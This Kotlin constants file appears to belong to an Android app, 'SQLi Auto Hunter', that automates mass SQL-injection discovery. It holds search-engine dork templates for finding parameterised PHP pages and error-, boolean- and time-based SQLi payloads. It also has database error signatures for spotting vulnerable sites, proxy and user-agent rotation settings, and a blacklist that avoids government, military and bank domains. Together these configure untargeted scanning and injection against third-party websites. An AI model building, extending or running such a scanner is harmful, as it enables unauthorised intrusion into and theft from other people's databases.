package com.yourapp.sqliautohunter.util

object Constants {
    // Database
    const val DATABASE_NAME = "sqli_hunter_db"
    const val DATABASE_VERSION = 1

    // Concurrency
    const val DEFAULT_CONCURRENCY = 4
    const val MAX_CONCURRENCY_LOW_RAM = 2
    const val MAX_CONCURRENCY_MEDIUM_RAM = 4
    const val MAX_CONCURRENCY_HIGH_RAM = 6
    const val BATCH_SIZE = 50

    // Timeouts
    const val NETWORK_TIMEOUT_SECONDS = 30L
    const val WEBVIEW_TIMEOUT_MS = 30000L
    const val SLEEP_TEST_DELAY_MS = 5000L
    const val SLEEP_TEST_TOLERANCE_MS = 2000L

    // Retry
    const val MAX_RETRIES = 3
    const val RETRY_BACKOFF_BASE_MS = 5000L
    const val RETRY_BACKOFF_MAX_MS = 60000L
    const val CIRCUIT_BREAKER_COOLDOWN_MS = 600000L // 10 minutes
    const val CIRCUIT_BREAKER_FAILURE_THRESHOLD = 10

    // Search
    const val SEARCH_RESULTS_PER_PAGE = 10
    const val MAX_SEARCH_PAGES = 3
    const val USER_AGENT_ROTATION_COUNT = 10

    // Hashing
    const val HASH_ALGORITHM = "SHA-256"

    // Notification
    const val NOTIFICATION_CHANNEL_ID = "sqli_hunter_channel"
    const val NOTIFICATION_CHANNEL_NAME = "SQLi Hunter"
    const val NOTIFICATION_ID = 1

    // Service
    const val SERVICE_ACTION_START = "com.yourapp.sqliautohunter.START"
    const val SERVICE_ACTION_PAUSE = "com.yourapp.sqliautohunter.PAUSE"
    const val SERVICE_ACTION_RESUME = "com.yourapp.sqliautohunter.RESUME"
    const val SERVICE_ACTION_STOP = "com.yourapp.sqliautohunter.STOP"

    // CSV
    const val CSV_BUFFER_SIZE = 10
    const val CSV_FILE_PREFIX = "sqli_results_"
    const val CSV_FILE_EXTENSION = ".csv"
    const val CSV_DELIMITER = ","

    // Settings
    const val SETTINGS_NAME = "sqli_hunter_settings"
    const val SETTING_THREAD_COUNT = "thread_count"
    const val SETTING_DELAY_MS = "delay_ms"
    const val SETTING_BULK_MODE = "bulk_mode"
    const val SETTING_PROXY_LIST = "proxy_list"
    const val SETTING_AUTO_EXPORT = "auto_export"
    const val SETTING_DEFAULT_THREAD_COUNT = 4
    const val SETTING_DEFAULT_DELAY_MS = 1000L
    const val SETTING_DEFAULT_BULK_MODE = false

    // Blacklist
    val DEFAULT_BLACKLIST_DOMAINS = listOf(
        ".gov",
        ".mil",
        ".gob",
        "bank",
        "gov",
        "mil",
        "government",
        "military",
        "admin",
        "login",
        "secure"
    )

    // Dork Templates
    val DORK_TEMPLATES = listOf(
        "inurl:php?id=",
        "inurl:index.php?id=",
        "inurl:product.php?catid=",
        "inurl:news.php?id=",
        "inurl:page.php?id=",
        "inurl:item.php?id=",
        "inurl:view.php?id=",
        "inurl:details.php?id=",
        "inurl:category.php?id=",
        "inurl:search.php?q="
    )

    // SQL Error Signatures
    val SQL_ERROR_SIGNATURES = listOf(
        "mysql_fetch",
        "SQL syntax",
        "ODBC",
        "Warning: mysql",
        "syntax error",
        "unclosed quotation mark",
        "quoted string not properly terminated",
        "SQL Server",
        "ORA-",
        "PostgreSQL",
        "syntax error at or near",
        "SQL command not properly ended",
        "MySQL",
        "error in your SQL syntax",
        "Fatal error: Call to undefined function",
        "ADODB",
        "DB2",
        "Oracle error"
    )

    // Payloads
    object Payloads {
        const val ERROR_BASED_SINGLE_QUOTE = "'"
        const val ERROR_BASED_DOUBLE_QUOTE = "\""
        const val ERROR_BASED_PAREN = ")"
        const val BOOLEAN_BASED_TRUE = "' AND 1=1 -- "
        const val BOOLEAN_BASED_FALSE = "' AND 1=2 -- "
        const val TIME_BASED_SLEEP = "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) -- "
        const val TIME_BASED_SLEEP_MYSQL = "' AND SLEEP(5) -- "
        const val TIME_BASED_SLEEP_PG = "' AND pg_sleep(5) -- "
    }

    // MIME Types
    object MimeTypes {
        const val TEXT_HTML = "text/html"
        const val APPLICATION_JSON = "application/json"
        const val TEXT_PLAIN = "text/plain"
    }

    // HTTP Status Codes
    object HttpStatus {
        const val OK = 200
        const val BAD_REQUEST = 400
        const val FORBIDDEN = 403
        const val NOT_FOUND = 404
        const val TOO_MANY_REQUESTS = 429
        const val SERVER_ERROR = 500
    }
}
